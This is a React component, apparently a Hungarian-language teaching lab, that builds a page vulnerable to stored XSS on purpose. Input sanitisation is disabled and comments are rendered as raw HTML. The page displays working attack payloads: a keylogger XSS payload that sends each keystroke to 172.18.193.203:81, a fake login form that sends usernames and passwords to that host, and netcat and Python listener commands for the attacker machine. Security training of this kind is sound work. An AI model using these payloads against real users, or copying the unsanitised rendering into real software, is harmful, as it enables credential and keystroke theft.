import React, { useState, useEffect } from 'react';
import DOMPurify from 'dompurify';

function FeedbackPage() {
  const [comment, setComment] = useState('');
  const [comments, setComments] = useState([]);
  const code = `<img src=x onerror="(() => {
    document.onkeypress = function(e) {
      var k = e.key || String.fromCharCode(e.which || e.keyCode);
      var x = new XMLHttpRequest();
      x.open('GET', 'http://172.18.193.203:81/keystrokes?key=' + encodeURIComponent(k), true);
      x.send();
    };
  })()">`;


  // Betöltjük a korábban elmentett üzeneteket a localStorage-ból
  useEffect(() => {
    const storedComments = localStorage.getItem('comments');
    if (storedComments) {
      setComments(JSON.parse(storedComments));
    }
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!comment) return;
    // VESZÉLYES: A felhasználó által bevitt üzenetet tisztítás nélkül tároljuk
    // const cleanComment = DOMPurify.sanitize(comment);
    //const newComments = [...comments, { id: Date.now(), content: cleanComment }];

    const newComments = [...comments, { id: Date.now(), content: comment }];
    setComments(newComments);
    localStorage.setItem('comments', JSON.stringify(newComments));
    setComment('');
  };

  return (
    <div>
      <h1>Ügyfélüzenetek (Stored XSS)</h1>
      <form onSubmit={handleSubmit}>
        <textarea
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          placeholder="Írd be az üzenetedet..."
          rows="4"
          cols="50"
        ></textarea>
        <br />
        <button type="submit">Küldés</button>
      </form>
      <h2>Elküldött üzenetek:</h2>
      <div>
        {comments.map((msg) => (
          <div
            key={msg.id}
            style={{
              border: '1px solid #ccc',
              margin: '10px',
              padding: '5px'
            }}
          >
            {/* VESZÉLYES: a tárolt üzenetet HTML-ként jelenítjük meg */}
            <div dangerouslySetInnerHTML={{ __html: msg.content }} />
            {/* <div>{msg.content}</div> */}
          </div>
        ))}
      </div>
      <p>
        Példa kipróbáláshoz: írd be az üzenetedbe a következőt:
        <br />
        <code>&lt;img src&#61;x onerror&#61;"alert('XSS')"&gt;</code>
       
      </p>
      <p>A keylogger és phishing támadásokhoz a támadó gépen indíts egy Netcat-et vagy egy python http szerver: <code>nc -nvlp 81</code> vagy <code>python -m http.server 81</code></p>    
      <p>
        Hamis belépési form, ami elküldi a felhasználó adatait:
        <br />
        <code>
        &lt;form action=&quot;http://172.18.193.203:81&quot; method=&quot;get&quot;&gt; 
        &lt;label for=&quot;username&quot;&gt;Felhaszn&aacute;l&oacute;:&lt;/label&gt;&lt;br&gt; 
        &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;br&gt;&lt;br&gt; 
        &lt;label for=&quot;password&quot;&gt;Jelsz&oacute;:&lt;/label&gt;&lt;br&gt; 
        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Bel&eacute;p&eacute;s&quot;&gt; &lt;/form&gt;
        </code>
       
      </p>
      <p>
        Keylogger payload: </p>
        <br />
        <pre>{code}</pre>
        
    </div>
  );
}

export default FeedbackPage;
